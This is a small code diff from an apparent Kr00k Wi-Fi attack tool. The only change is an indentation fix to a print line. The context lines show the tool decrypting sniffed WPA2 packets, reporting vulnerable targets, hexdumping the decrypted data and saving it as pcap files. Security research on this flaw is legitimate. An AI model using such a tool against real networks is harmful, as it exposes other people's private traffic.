@@ -122,7 +122,7 @@ class Krooker:
             dec_data = self.wpa2_decrypt(sniffed_pkt)
             # Check if the target is vulnerable
             if dec_data and dec_data[0:len(KR00K_PATTERN)] == KR00K_PATTERN:
-               print("\033[1;35;49m["+str(datetime.now().time())+"][+] Target "+self.target_mac+" is vulnerable to Kr00k, decrypted "+str(len(dec_data))+" bytes")
+                print("\033[1;35;49m["+str(datetime.now().time())+"][+] Target "+self.target_mac+" is vulnerable to Kr00k, decrypted "+str(len(dec_data))+" bytes")
                 hexdump(dec_data)
                 # Save the encrypted and decrypted packets
                 print("\033[0;39;49m;["+str(datetime.now().time())+"][+] Saving encrypted and decrypted 'pcap' files in current folder")
